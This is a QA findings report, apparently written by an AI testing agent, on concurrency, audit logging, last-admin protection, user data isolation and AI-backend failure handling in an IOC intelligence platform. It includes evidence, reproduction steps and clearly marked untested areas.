#### 7. set_user_active() writes a config_audit_log entry on every call, even when the value doesn't actually change (audit log overcounts real changes)

- **Severity:** P2
- **Dimension:** Multi-admin concurrency
- **Title:** set_user_active() writes a config_audit_log entry on every call, even when the value doesn't actually change (audit log overcounts real changes)
- **Description:** app/core/users.py's set_user_active() unconditionally calls record_audit() after every successful call, with no 'did this actually change anything' guard -- unlike its sibling update_user(), which only commits/logs when the computed `changes` list is non-empty. Under concurrency (or even sequential idempotent calls), this produces audit entries that describe a real-looking 'user.disable'/'user.enable' event for a request that was actually a no-op re-assertion of the already-current state, indistinguishable in the log from a genuine transition.
- **Evidence:** Live test: user X created active=true. Admin B and Admin C fired POST /admin/users/{id}/active {is_active:false} concurrently (overlapping intervals: B 139720.4516-139720.4968, C 139720.4520-139720.5269). Both got HTTP 200. Final DB state: is_active=false (consistent, correct). But config_audit_log recorded TWO 'user.disable' rows (10:35:53.880597 actor qa-ent-admin-b@qa.test, and 10:35:53.909752 actor qa-ent-admin-c@qa.test) for what was really only ONE actual true->false transition -- the second row is a logged no-op. A later race (B enable=true, C disable=false, concurrent, starting from false) added a THIRD 'user.disable' row (10:35:53.941848, actor c) that was again a no-op (state was already false), followed by a real 'user.enable' (10:35:53.946322, actor b). Across the test, 3 'user.disable' log entries exist for effectively 1 real disable transition. Contrast (same race pattern, sibling function): B and C both PATCH role='viewer' concurrently on the SAME target value -- only ONE 'user.update' audit row was written (attributed to whichever admin's transaction committed first); the second, no-op-equivalent request produced zero audit rows, because update_user() guards logging with `if changes:`. Verified independently via `docker exec app-postgres-1 psql -U ioc -d ioc_intel -c "SELECT timestamp, action, actor_email, detail FROM config_audit_log WHERE detail ILIKE '%qa-ent-multiadmin-x%' ORDER BY timestamp;"` which returned exactly the 8 rows matching the script's own readback (3 of which are phantom/no-op 'user.disable' entries).
- **Reproduction:** 1) Create a disposable ANALYST user X (active=true). 2) Fire two concurrent POST /api/v1/admin/users/{X}/active {"is_active": false} from two different admin tokens via asyncio.gather. 3) Query config_audit_log for X's email: two 'user.disable' rows appear even though only one real active->inactive transition occurred. 4) For contrast, repeat with two concurrent PATCH /api/v1/admin/users/{X} {"role": "<same new value>"} instead: only one 'user.update' row appears, because update_user()'s `if changes:` guard (missing from set_user_active()) correctly suppresses the no-op's audit entry. Full request/response/DB evidence captured in-session; source of the asymmetry is in app/core/users.py, comparing set_user_active() (no change-guard before record_audit()) against update_user() (`if changes: await db.commit(); ... if changes: await record_audit(...)`).

#### 8. Last-admin-protection lock (_lock_all_admin_rows) is taken unconditionally on every admin-console user mutation, serializing ALL concurrent admin actions platform-wide regardless of relevance

- **Severity:** P2
- **Dimension:** Multi-admin concurrency
- **Title:** Last-admin-protection lock (_lock_all_admin_rows) is taken unconditionally on every admin-console user mutation, serializing ALL concurrent admin actions platform-wide regardless of relevance
- **Description:** update_user() and set_user_active() both call `_lock_all_admin_rows(db)` (a `SELECT * FROM users WHERE role='ADMIN' FOR UPDATE`) at the very start of every transaction, unconditionally -- even for a plain full_name edit on a non-admin VIEWER, and even when `role`/`is_active` isn't changing at all. This means any two concurrent admin-console mutations anywhere in the system contend for the same lock and serialize, even when their target rows are completely unrelated to each other and to any admin account. The module's own docstring says the lock is taken 'on every ADMIN-role row before counting how many active admins would remain' on 'set_user_active() and update_user()'s role-demotion path' -- but the code in update_user() takes the lock before even checking whether `role` was supplied, so it also fires on full_name-only edits, contradicting that stated scope.
- **Evidence:** Live test: baseline PATCH /api/v1/admin/users/{Z}/ {"full_name":...} on a disposable VIEWER user Z (no relation to any admin row) completed in 0.020s. Then, with a separate raw asyncpg connection holding `BEGIN; SELECT id FROM users WHERE role='ADMIN' FOR UPDATE;` open (uncommitted) for 2.5s, the SAME kind of PATCH full_name call on the SAME unrelated non-admin user Z took 2.519s -- it blocked for essentially the entire hold duration before completing, confirming it queued behind the lock on rows it has no logical relationship to. A control GET /api/v1/admin/users (list_users, which takes no lock) issued during the same hold window returned in 0.009s, confirming reads are unaffected and isolating the block to the FOR UPDATE-taking mutation path specifically.
- **Reproduction:** 1) Create a disposable VIEWER user Z. 2) From a raw DB connection (asyncpg or psql), run `BEGIN; SELECT id FROM users WHERE role='ADMIN' FOR UPDATE;` and hold the transaction open (e.g. `SELECT pg_sleep(2.5)`) without committing. 3) While that's held, issue `PATCH /api/v1/admin/users/{Z} {"full_name": "x"}` as any admin: it blocks for ~the remaining hold duration even though Z is a VIEWER and the payload never touches role or is_active. 4) Repeat with `GET /api/v1/admin/users` during the same hold: returns immediately, confirming only the FOR-UPDATE-taking write path is affected. Source: app/core/users.py `update_user()`'s `locked_admins = await _lock_all_admin_rows(db)` runs before any check of whether `role` is None, and `set_user_active()` does the same before checking whether the target is even an admin.

#### 9. No lost-update / silent-overwrite pattern found; final DB state was consistent and every real state transition had a corresponding audit entry

- **Severity:** info
- **Dimension:** Multi-admin concurrency
- **Title:** No lost-update / silent-overwrite pattern found; final DB state was consistent and every real state transition had a corresponding audit entry
- **Description:** Across all 4 concurrent-race scenarios (identical-value disable race, conflicting enable/disable race, identical-value role race, cross-field role+disable race), the DB row for the contested user always ended in a single, internally consistent state (never a partial/mixed state), and every request that produced a real state transition had a matching config_audit_log row correctly describing that transition (including which of the two concurrent admins' change ended up as the final state, e.g. race B: B's concurrent enable=true committed after C's disable=false, and the final DB state (true) matched the last-committed audit row's description). This is because both mutation functions take a `SELECT ... FOR UPDATE` lock on the target row and re-read its current value AFTER acquiring the lock, before computing what (if anything) changed, which prevents blind overwrites. This confirms the module docstring's core correctness claim (serialized, race-safe mutation of a given user row) held up under real concurrent load in this environment -- the two findings above are about audit-log accuracy and lock-scope/throughput, not data corruption or silent loss.
- **Evidence:** Race A (B,C both disable concurrently from active=true): final DB is_active=false, matches both requests' intent, 2 audit rows both correctly describe 'Disabled'. Race B (B enable=true, C disable=false, concurrent, from false): final DB is_active=true, matching admin-b's request, and the last-committed audit row ('Enabled...', actor b, timestamp .946322) matches the final state; C's earlier-committed 'Disabled' row (.941848) accurately reflects that C's own transaction really did (transiently) set it false before B's commit. Race D (B changes role viewer->analyst, C disables, different columns, concurrent): final DB state role=analyst AND is_active=false -- both concurrent changes to different columns on the same row were correctly merged, neither was lost.
- **Reproduction:** See the 4-race script output captured in-session; independently re-verified via `docker exec app-postgres-1 psql -U ioc -d ioc_intel -c "SELECT timestamp, action, actor_email, detail FROM config_audit_log WHERE detail ILIKE '%qa-ent-multiadmin-x%' ORDER BY timestamp;"`, which matches the script's own readback exactly (8 rows, ordering and content as reported).

#### 10. Code-review verdict: last-admin guard logic is correct by inspection (role demotion + disable, race-safe)

- **Severity:** info
- **Dimension:** Last-administrator protection (demote/disable guard on the LAST active admin)
- **Title:** Code-review verdict: last-admin guard logic is correct by inspection (role demotion + disable, race-safe)
- **Description:** backend/app/core/users.py implements the guard in two call sites. In update_user() (lines 203-213): when role != user.role and user.role == Role.ADMIN and role != Role.ADMIN and user.is_active, it calls _remaining_active_admins(locked_admins, excluding=user.id) and raises LastAdminError if 0. In set_user_active() (lines 236-238): when not is_active and user.role == Role.ADMIN and user.is_active, same check before disabling. Both are preceded by _lock_all_admin_rows(db) (lines 73-78), which takes `SELECT ... WHERE role = ADMIN FOR UPDATE` on every ADMIN-role row up front (not just the target row), before counting. This is what makes the two-concurrent-disables race safe: two transactions each targeting a DIFFERENT one of the last two admins will both try to lock the *same overlapping ADMIN row set*, so Postgres serializes them -- the second transaction blocks until the first commits, then re-evaluates and correctly sees 0 remaining. A bare per-target row lock would not catch this (each transaction would see the other admin still active and both would succeed, leaving zero admins). The _remaining_active_admins() helper (lines 81-82) correctly excludes the target by id and counts only rows with is_active=True. Its 4 boundary-condition unit tests (excludes target / zero-when-only-active-one / counts-only-active-rows / empty-list) were run live in this session and all pass. The route layer (api/routes/admin.py lines 65-88) correctly maps LastAdminError to HTTP 409 for both the PATCH role and POST active endpoints, and require_permission('user:manage') gates both to ADMIN-only per ROLE_PERMISSIONS in models/user.py. SelfRoleChangeError is checked before the last-admin check in update_user, which does not weaken the guard (self-demotion is blocked unconditionally regardless of admin count). By inspection this logic is correct and matches its own docstring's race-safety claim.
- **Evidence:** backend/app/core/users.py lines 73-82 (_lock_all_admin_rows, _remaining_active_admins), 203-213 (update_user role-demotion guard), 236-238 (set_user_active guard); backend/app/api/routes/admin.py lines 65-88 (409 mapping, require_permission('user:manage')); backend/app/models/user.py lines 42-48 (ROLE_PERMISSIONS -- user:manage is ADMIN-only). Live run: `docker exec app-backend-1 python -m pytest app/tests/unit/test_users_service.py -v` -> 4 passed, 0 failed.
- **Reproduction:** Not applicable -- this is a static code-review finding, informational.

#### 11. Live trigger of LastAdminError itself -- NOT TESTED -- ENVIRONMENT LIMITATION

- **Severity:** not_tested
- **Dimension:** Last-administrator protection (demote/disable guard on the LAST active admin)
- **Title:** Live trigger of LastAdminError itself -- NOT TESTED -- ENVIRONMENT LIMITATION
- **Description:** The guard's count is deliberately global (every ADMIN-role row in the whole users table, not scoped to any subset), which is precisely what makes it correct -- but it also means the actual 'last admin' boundary (_remaining_active_admins(...) == 0) cannot be forced to fire in this shared environment without first driving the count of active ADMIN rows platform-wide down to exactly the one disposable target, i.e. temporarily disabling every real admin account (there were 7 active ADMIN rows at test time, including kokos@gmail.com and final-rtp-admin@example.com). The task's own constraints explicitly prohibit disabling the real admins, so this specific branch (the actual raise LastAdminError line, and the true 409 response) was not exercised live. What WAS exercised live: the same guarded HTTP endpoints, same permission path, same audit logging, and same service functions, but with the count intentionally left non-zero (7 active admins), which correctly produced the non-blocked path (two 200 responses) -- this confirms the guard doesn't over-fire and that the plumbing (JWT auth, RBAC, service call, response serialization) works end-to-end, but it is not equivalent to observing the 409 rejection itself. Note for completeness: the dev tree already contains an integration-test fixture, app/tests/integration/test_admin_users.py's `_isolated_admin_set`, that does force this exact boundary by temporarily setting is_active=False on every pre-existing active admin inside a try/finally that restores each one's exact prior value even on failure -- and test_cannot_demote_the_last_active_admin / test_cannot_disable_the_last_active_admin / test_concurrent_disable_of_both_last_admins_only_one_succeeds all exercise the real 409/LastAdminError path against Postgres this way. This is a legitimate pattern for an isolated test database, but was deliberately NOT invoked in this session because it requires transiently disabling kokos@gmail.com and final-rtp-admin@example.com, which the task explicitly instructed must not be done in this shared, live environment. Verified after the session that both real admin accounts remain role=ADMIN, is_active=true, untouched.
- **Evidence:** docker exec app-postgres-1 psql query at test time: 7 active ADMIN rows platform-wide. Post-test verification query: kokos@gmail.com and final-rtp-admin@example.com both role=ADMIN, is_active=t (unchanged). Existing fixture reference: backend/app/tests/integration/test_admin_users.py lines 74-100 (_isolated_admin_set) and lines 148-229 (the three tests that use it to force and verify the real 409 path, including the concurrency race test).
- **Reproduction:** Would require: (1) recording exact is_active for every currently-active ADMIN row, (2) setting all to is_active=false inside a try/finally guaranteeing restoration, (3) creating one disposable ADMIN, (4) attempting PATCH role=analyst and POST active=false on it and confirming HTTP 409 with a LastAdminError-derived detail message, (5) restoring every real admin's original is_active in the finally block regardless of outcome. Not run here per explicit task instruction not to disable real admin accounts, even transiently.

#### 12. Concurrent same-user admin edits: no lost updates, no corruption, correctly serialized

- **Severity:** info
- **Dimension:** General concurrency
- **Title:** Concurrent same-user admin edits: no lost updates, no corruption, correctly serialized
- **Description:** Two admins (admin-a, admin-b) fired truly concurrent PATCH /admin/users/{id} at a shared disposable target: (a) both changed full_name to different values in the same instant, (b) both changed role to different values ('viewer' vs 'admin') in the same instant. Both requests in every pair returned HTTP 200, the final DB state was always exactly one of the two written values (never a merged/corrupted state), and all 4 edits produced 4 distinct config_audit_log rows (no lost audit entries). This confirms app/core/users.py's update_user() with_for_update() lock on the admin-rows set (plus the target row) correctly serializes concurrent writers rather than racing. No defect found.
- **Evidence:** PATCH /api/v1/admin/users/{target_id} fired via asyncio.gather from admin-a (full_name='Edited-By-A') and admin-b (full_name='Edited-By-B') both returned 200; DB row.full_name ended as exactly 'Edited-By-A'. Follow-up role race (viewer vs admin) both returned 200; DB row.role ended as exactly 'viewer'. config_audit_log showed 4 distinct 'user.update' rows for the target, one per PATCH, none dropped.
- **Reproduction:** Mint ADMIN JWTs for two personas via create_access_token(); create a disposable target user; fire two concurrent httpx PATCH /api/v1/admin/users/{id} calls via asyncio.gather with different full_name (then different role) payloads; assert both 200 and that config_audit_log has one row per call.

#### 13. Concurrent AI-provider credential/activation writes on a disposable slot ('gemini'/'bedrock'): correctly serialized, no split-brain state

- **Severity:** info
- **Dimension:** General concurrency
- **Title:** Concurrent AI-provider credential/activation writes on a disposable slot ('gemini'/'bedrock'): correctly serialized, no split-brain state
- **Description:** Two admins concurrently POSTed conflicting credentials to the same unconfigured 'gemini' provider slot (api_key A vs B), and then concurrently activated 'gemini' (admin-a) vs 'bedrock' (admin-b) as the platform's active AI backend. Both requests in each pair returned 200. After the credential race, the row held exactly one of the two values (masked as '************AAAA' or '************BBBB', not a merge of both). After the activation race, querying provider_runtime_configs showed exactly one AI-backend row with is_active=true at all times -- never zero, never two -- confirming app/core/runtime_config.py's with_for_update()-protected upsert (for credentials) and the full-table-rewrite pattern in set_active_ai_backend() correctly avoid split-brain state under concurrency. This held even though a separate, unrelated QA process was simultaneously hammering the same /runtime/ai-active endpoint ~387 times/2min during the test window (persona qa-ent-chaos-6e19d35b@qa.test, not part of this test) -- the single-active-backend invariant never broke under that combined load either. No defect found.
- **Evidence:** POST /api/v1/runtime/ai-providers/gemini from admin-a (api_key=qa-test-key-AAAA) and admin-b (api_key=qa-test-key-BBBB) via asyncio.gather both returned 200; response masked_credentials showed '************AAAA' and '************BBBB' respectively (never a mixed value). Concurrent POST /api/v1/runtime/ai-active with backend='gemini' (admin-a) and backend='bedrock' (admin-b) both returned 200; SELECT provider_id FROM provider_runtime_configs WHERE kind='AI' AND is_active=true immediately after returned exactly one row ('gemini').
- **Reproduction:** Mint two ADMIN JWTs; asyncio.gather two POST /api/v1/runtime/ai-providers/gemini calls with different credentials; asyncio.gather two POST /api/v1/runtime/ai-active calls with different backends; query provider_runtime_configs to confirm exactly one active row and a non-mixed credential value.

#### 14. Concurrent IOC investigations complete correctly (no cross-contamination) but degrade sharply in latency -- 3 of 5 simultaneous pipelines took 87-160s vs. the ~20-40s single-run baseline documented in the test suite

- **Severity:** P3
- **Dimension:** General concurrency
- **Title:** Concurrent IOC investigations complete correctly (no cross-contamination) but degrade sharply in latency -- 3 of 5 simultaneous pipelines took 87-160s vs. the ~20-40s single-run baseline documented in the test suite
- **Description:** Five disposable users (2 analysts, 3 admins) each submitted POST /lookup/stream for a distinct benign public IP at the same instant. Correctness held perfectly: all 5 reached final status COMPLETED, each lookup_id's persisted ioc_value and requested_by matched exactly the submitting user's own IP/id (zero cross-user data bleed), and no duplicate lookup_ids were created. However, completion latency was 100.1s, 87.0s, 89.4s, 125.6s, and 160.6s respectively -- 3-8x the ~20-40s baseline the codebase's own integration-test docstring (test_security_assessment_api.py) describes for a single unstubbed run. An initial run with a 120s client timeout actually cut off 3 of the 5 requests before they finished (server correctly marked them FAILED via the documented GeneratorExit->mark-failed path, itself evidence the disconnect-handling code works correctly), and only completed once the timeout was raised to 300s. The backend runs as a single uvicorn process (no --workers), and the platform's active AI backend during this run was 'ollama' (a local model), which is a plausible single-instance-inference bottleneck for the per-provider summarize_provider + final generate_final_assessment AI calls that every concurrent investigation funnels through -- no application-level lock/semaphore was found gating this (grepped app/ai/ and app/providers/orchestrator.py), so the degradation looks like genuine resource contention rather than an app bug. CONFOUND TO DISCLOSE: a separate, unrelated QA test process (persona qa-ent-chaos-*) was simultaneously flipping the active AI backend ~387 times over roughly the same 2-minute window on this shared live instance, which may have added extra AI-backend churn/latency on top of my own 5-way load; I cannot cleanly separate how much of the slowdown is from my 5 concurrent requests alone versus this sibling load. Recommend re-running this specific latency measurement in an isolated window with no other test traffic before treating the exact multiplier as authoritative -- the *fact* of significant degradation under concurrent load and the *absence* of any data-integrity fault are both solid findings from this run.
- **Evidence:** ioc_lookups rows for this run: 1.1.1.1/qa-ent-analyst-a 100.1s COMPLETED, 9.9.9.9/qa-ent-analyst-b 87.0s COMPLETED, 8.8.8.8/qa-ent-admin-a 89.4s COMPLETED, 8.8.4.4/qa-ent-admin-b 125.6s COMPLETED, 208.67.222.222/qa-ent-admin-c 160.6s COMPLETED -- all with ioc_value and requested_by matching the submitting persona exactly. config_audit_log showed 387 ai_provider.activate rows from actor 92647808-050f-44da-bf12-82340cb6ba61 (qa-ent-chaos-6e19d35b@qa.test) interleaved throughout the same window at ~270ms intervals.
- **Reproduction:** Mint 5 JWTs (2 ANALYST, 3 ADMIN) for existing qa-ent-analyst-a/b and qa-ent-admin-a/b/c personas; asyncio.gather 5 POST /api/v1/lookup/stream calls each with a distinct benign public IP body {'value': ip}, consuming the SSE stream to its 'done' event; time each; cross-check ioc_lookups.ioc_value/requested_by against the submitting persona per lookup_id.

#### 15. Basket isolation: enforced exactly as documented (no defect)

- **Severity:** info
- **Dimension:** Data isolation between users (basket / case / lookup ownership scoping)
- **Title:** Basket isolation: enforced exactly as documented (no defect)
- **Description:** docs/API_DOCUMENTATION.md §10 states the basket is 'per-analyst private scratch space (scoped to BasketItem.owner_id == user.id)'. Code confirms every basket route (list/add/delete/clear) filters by `BasketItem.owner_id == user.id`. Live test: B's `GET /basket` returned `200 []` and did not contain A's item; B's `DELETE /basket/{A's item_id}` returned `404 {"detail":"Basket item not found"}` -- identical to the response for a random non-existent UUID, so there is no oracle distinguishing 'exists but not yours' from 'does not exist'. There is also no `GET /basket/{id}` route at all (only list, add, delete-by-id, clear, compare) -- attempting one returns `405 Method Not Allowed` for anyone, including the owner -- so 'read a single basket item by ID' is not an operation the API exposes at all, not even to its own owner.
- **Evidence:** B GET /basket -> 200, body []. B DELETE /basket/{e4e7dc60-e144-49ce-851b-0b4db3c17829} (A's real item) -> 404 {"detail":"Basket item not found"}. B DELETE /basket/{random-uuid} -> identical 404 body. B GET /basket/{item_id} -> 405 Method Not Allowed.
- **Reproduction:** —
- **failure_scenario:** N/A -- isolation held. No input caused B to see, delete, or otherwise infer the existence of A's basket item.

#### 16. Case isolation: none exists, exactly as documented (no defect)

- **Severity:** info
- **Dimension:** Data isolation between users (basket / case / lookup ownership scoping)
- **Title:** Case isolation: none exists, exactly as documented (no defect)
- **Description:** docs/API_DOCUMENTATION.md §11 and the cases.py module docstring both explicitly state case visibility 'mirrors lookups -- shared across the whole SOC team for anyone with the relevant permission ... not a private-per-analyst construct like the basket.' Code confirms `_load_case()` and every case route (`GET/PATCH /cases/{id}`, `POST /cases/{id}/close`, `POST /cases/{id}/iocs`, `POST /cases/{id}/notes`) query only by `Case.id`, with zero `analyst_id`/owner check -- gated purely by role-based `case:read`/`case:write`/`case:close` permission, which both ANALYST and ADMIN hold. Live test: analyst B, with no relationship to A's case, successfully read it (`GET /cases/{id}` -> 200 full body including A's notes/IOCs/reports), rewrote its title and status (`PATCH /cases/{id}` -> 200, title changed to 'qa-ent-MODIFIED-BY-B', status open->investigating), and added a note to it (`POST /cases/{id}/notes` -> 201) -- all without any authorization error. This is the actual, intentional design per the docs' own claim, not a discovered vulnerability -- but it does mean, concretely, that any analyst can silently take over, retitle, re-triage (change severity/status), or inject notes into any other analyst's case with no per-case ACL, assignment concept, or B-side error to signal the action was cross-analyst.
- **Evidence:** B GET /cases/{31e7e85c-...} -> 200, full case body (analyst_id = A's UUID, not B's). B PATCH /cases/{same id} {title, status} -> 200, title now 'qa-ent-MODIFIED-BY-B', status 'investigating'. B POST /cases/{same id}/notes -> 201.
- **Reproduction:** —
- **failure_scenario:** Any authenticated analyst account (not just admins) can modify or annotate a case they never created or were assigned to, with the response looking identical to a legitimate same-team edit -- e.g. a compromised or malicious low-privilege analyst account could quietly downgrade a case's severity/status or plant misleading notes on another analyst's active investigation.

#### 20. No 'clear credential' path exists in upsert_ai_provider by design

- **Severity:** info
- **Dimension:** Provider credential lifecycle mechanics (AI provider config: save/edit/mask/connection-test/reset, concurrent-write safety)
- **Title:** No 'clear credential' path exists in upsert_ai_provider by design
- **Description:** runtime_config.py's _merge_credentials() intentionally merges incoming fields onto the existing stored credentials and never removes a key (documented in the code as fixing a prior bug where an empty save wiped a working credential). This is correct behavior for the settings-UI use case, but it means there is no supported API-level way to blank/reset a provider slot back to a truly empty masked_credentials={} state -- QA had to reset the disposable test row directly via the ORM (setting encrypted_credentials='' on the row) rather than through upsert_ai_provider. Not a bug given the documented intent, but worth flagging: if an operator ever needs to genuinely revoke/clear a stored AI credential (e.g. compromised key) rather than replace it with a new one, today's UI/API has no direct affordance for that -- only overwrite-with-a-new-value.
- **Evidence:** app/core/runtime_config.py _merge_credentials(): 'if not incoming: return _decrypt_credentials(row)' and 'There is no "clear a credential" affordance in the UI today, so this doesn't remove any reachable capability.' Confirmed empirically: calling upsert_ai_provider('gemini', {}, None) leaves prior credentials fully intact; only a direct DB write (row.encrypted_credentials = '') achieved a true reset in this test.
- **Reproduction:** Inside app-backend-1: await upsert_ai_provider('gemini', {'api_key': 'X'}, None); await upsert_ai_provider('gemini', {}, None); list_ai_providers() still shows configured=True with the same masked api_key -- confirms an empty-dict save cannot clear a credential.

#### 21. RBAC-gated HTTP surface (POST /api/v1/runtime/ai-providers/{backend}, POST /api/v1/ai/test) not exercised end-to-end

- **Severity:** not_tested
- **Dimension:** Provider credential lifecycle mechanics (AI provider config: save/edit/mask/connection-test/reset, concurrent-write safety)
- **Title:** RBAC-gated HTTP surface (POST /api/v1/runtime/ai-providers/{backend}, POST /api/v1/ai/test) not exercised end-to-end
- **Description:** This dimension was scoped and executed at the service-layer (app.core.runtime_config / app.ai.connection_test), per the task's explicit instruction to use svc.upsert_ai_provider(...) directly. Doing the same lifecycle through the real HTTP endpoints (app/api/routes/runtime.py, app/api/routes/ai_config.py) would additionally require a real DB-backed user row for require_permission('provider:manage') to resolve (get_current_user in app/auth/rbac.py does a live `select(User).where(User.email == ...)` DB lookup and rejects tokens for emails with no matching active user row -- contrary to the task brief's premise that a minted JWT needs no DB lookup). Creating a disposable admin user was judged out of scope for a credential-lifecycle-mechanics test and was not done, so the RBAC/route wiring itself (as opposed to the underlying service functions it calls) is NOT TESTED here.
- **Evidence:** app/auth/rbac.py get_current_user(): 'result = await db.execute(select(User).where(User.email == payload["sub"])); user = result.scalar_one_or_none(); if not user or not user.is_active: raise credentials_error' -- a minted token for a non-existent qa-ent-*@qa.test email would get 401, not reach the route handler.
- **Reproduction:** NOT TESTED -- ENVIRONMENT/SCOPE LIMITATION. Would require creating a disposable admin-role user row, minting a token for it, then calling POST /api/v1/runtime/ai-providers/gemini and POST /api/v1/ai/test over HTTP, then cleaning up the user via the FK-safe delete pattern.

#### 22. Final-assessment generation can exhaust its one retry and fall back to 'unavailable' on a fully healthy AI backend, indistinguishable from a real outage

- **Severity:** P2
- **Dimension:** AI backend chaos (IOC Intelligence Platform)
- **Title:** Final-assessment generation can exhaust its one retry and fall back to 'unavailable' on a fully healthy AI backend, indistinguishable from a real outage
- **Description:** generate_final_assessment() (app/ai/service.py) retries exactly once, and only for pydantic ValidationError (self-contradictory verdict/risk pairs from the model). Live against IOC '1.0.0.1' with a fully healthy, correctly-restored ollama/gemma2:2b backend and real mixed-signal evidence (OTX flagged it malicious/associated with malware families while Spamhaus/WHOIS showed it clean), gemma2:2b produced two DIFFERENT self-contradictory outputs across its two attempts: attempt 1 gave final_verdict='benign' with risk.malicious_probability=90.0 (rejected by the model's own consistency validator), attempt 2 gave final_verdict='malicious' with risk.malicious_probability=1.0 (also rejected). Both attempts exhausted, so the pipeline correctly avoided fabricating a verdict and fell back to the generic 'AI-generated assessment unavailable (generation error)' text -- even though all 4 per-provider AI summaries for the same lookup had generated successfully moments earlier. This is not data corruption (the anti-hallucination validator worked exactly as designed) and the lookup still completed cleanly, but from the API/UI's perspective this failure mode renders identically to a total AI-backend outage (same generic exec_summary string), even though the root cause and remediation are completely different (transient small-model sampling flakiness on mixed-signal evidence vs. genuine infra/config failure). A second, immediate reproduction attempt on a low-signal domain succeeded on the first try, confirming this is stochastic model flakiness rather than a deterministic bug.
- **Evidence:** docker logs app-backend-1 (~10:5x UTC 2026-08-15): 'Final assessment attempt 1 failed for 1.0.0.1: 1 validation error for FinalAssessment ... final_verdict="benign" contradicts risk.malicious_probability=90.0 ... -- retrying once' followed immediately by 'Final assessment generation failed for 1.0.0.1: 1 validation error for FinalAssessment ... final_verdict="malicious" contradicts risk.malicious_probability=1.0 ...'. Corresponding SSE final_assessment event returned ai_backend=None, final_verdict='unknown', executive_summary='AI-generated assessment unavailable (generation error). See individual provider results and summaries below for raw findings.' despite 4 real per-provider summaries (spamhaus/whois_rdap/otx/internet_intelligence) having already been generated successfully in the same run.
- **Reproduction:** 1) With ollama/gemma2:2b active and healthy, POST /api/v1/lookup/stream {"value": "1.0.0.1"} (or any IOC likely to produce genuinely conflicting provider signals, e.g. an IP OTX flags maliciously-associated but Spamhaus/WHOIS show clean). 2) Inspect server logs for 'Final assessment attempt 1 failed' / 'Final assessment generation failed' pydantic ValidationError messages, and confirm the SSE final_assessment event's executive_summary is the generic 'unavailable' fallback rather than a real assessment, even though no AI backend was ever actually down.

#### 23. Active-AI-backend switching under chaos degrades gracefully and does not corrupt data (positive confirmation), but backend attribution within one investigation is non-atomic

- **Severity:** info
- **Dimension:** AI backend chaos (IOC Intelligence Platform)
- **Title:** Active-AI-backend switching under chaos degrades gracefully and does not corrupt data (positive confirmation), but backend attribution within one investigation is non-atomic
- **Description:** Confirmed live, not a defect: issuing ~400 rapid-fire POST /runtime/ai-active calls (alternating ollama <-> an unconfigured disposable 'bedrock' slot every 0.25s) throughout a single ~127s investigation produced zero HTTP errors on the switch endpoint itself (no IntegrityError/deadlock from concurrent writes to the same provider_runtime_configs rows) and the investigation still reached status=COMPLETED. Because app/ai/service.py's _get_ai_client() does a fresh DB read of the active backend on every single AI call (by design, to support 'switch AI, no restart'), a single investigation's per-provider summaries can land on different backend states than its own final assessment: in this run, 2 of 3 AI-summarized providers landed on the healthy ollama backend and got real summaries, while 1 (whois_rdap) and the final assessment call both happened to land on the disposable unconfigured 'bedrock' slot at that instant and degraded cleanly to the documented 'AI backend failed to generate a summary...' / 'AI-generated assessment unavailable...' fallback text -- no crash, no hang, no fabricated content, no stuck lookup. Simulating a total outage (ollama base_url pointed at an unreachable port) behaved identically: fast ConnectError-based failures (~18s total, no long timeout/hang, no retry loop since the retry logic only fires for ValidationError), clean per-call fallback text, lookup still reached COMPLETED. The only minor observability gap: the persisted FinalAssessmentRecord.ai_backend/ai_model only capture which backend served the FINAL call, not which backend(s) served each per-provider summary, so an investigation that is a mix of real and degraded content has no field indicating that mix beyond reading each summary's caveats text.
- **Evidence:** Rapid-switch run: lookup 46d1ada2-... completed with status=COMPLETED; ai_summaries.caveats for whois_rdap = 'The AI backend failed to generate a summary for this provider's data (see server logs for details).' while spamhaus/internet_intelligence for the same lookup have empty caveats (real summaries); final_assessment executive_summary was the generic unavailable fallback; 400 config_audit_log 'ai_provider.activate' rows recorded in the ~5-minute test window with zero non-200 responses among the 397 switch calls made during the stream itself. Outage-simulation run: elapsed 18.1s total, both provider summaries and the final assessment degraded to the documented fallback text, lookup still reached COMPLETED (confirmed via DB).
- **Reproduction:** See Test 2 and Test 3 methodology described in the summary; no further action needed -- this documents expected, correctly-handled behavior under the requested chaos conditions.

#### 24. Stale 'last test: failed' status can persist on the AI Providers panel for a backend that is actually healthy and actively serving investigations

- **Severity:** P3
- **Dimension:** AI backend chaos (IOC Intelligence Platform)
- **Title:** Stale 'last test: failed' status can persist on the AI Providers panel for a backend that is actually healthy and actively serving investigations
- **Description:** At the start of this session, before any action of mine, the 'ollama' row in provider_runtime_configs already showed last_test_ok=false / last_test_message='Ollama base URL and model are both required.' (timestamped 2026-08-15 04:53 UTC, actor 'claude-code-test' in config_audit_log -- not an @qa.test disposable identity, suggesting a prior automated session already exercised this exact base_url-outage scenario and restored the credentials but never re-ran a successful /api/v1/ai/test to refresh the recorded test status). I independently confirmed during this session that ollama/gemma2:2b was, in fact, fully functional at that time (real per-provider AI summaries were generated correctly). Because upsert_ai_provider() (used both to break and to restore the base_url) never calls record_ai_test_result(), reconfiguring credentials back to a working value does not clear or refresh the previous failure recorded on the Manage AI Providers panel. An admin looking at that panel after a transient outage-and-recovery cycle (exactly the scenario this dimension simulates) would see a persistent 'last tested: failed' badge on the currently-active, currently-working backend until someone manually clicks 'Test connection' again.
- **Evidence:** GET /api/v1/runtime/ai-providers (admin token) at session start returned for provider_id='ollama': is_active=true, configured=true, model_id='gemma2:2b', last_test_ok=false, last_test_message='Ollama base URL and model are both required.', last_test_at='2026-08-12T14:29:39' (3 days stale) while updated_at='2026-08-15T04:53:03' (same-day, from a configure call) -- i.e. the credentials were touched/restored same-day but the test result was never refreshed. I did not attempt to fix this pre-existing state since it predates my session; noting it as inherited/NOT something I introduced or resolved.
- **Reproduction:** GET /api/v1/runtime/ai-providers as a provider:manage user and inspect the 'ollama' entry's last_test_ok/last_test_message/last_test_at vs. updated_at/configured/is_active fields for this same staleness pattern.

#### 25. Confirmed live: single-provider failures degrade gracefully, whole investigation still completes

- **Severity:** info
- **Dimension:** IOC provider chaos (backend/app/providers registry + orchestrator resilience, malformed-input handling)
- **Title:** Confirmed live: single-provider failures degrade gracefully, whole investigation still completes
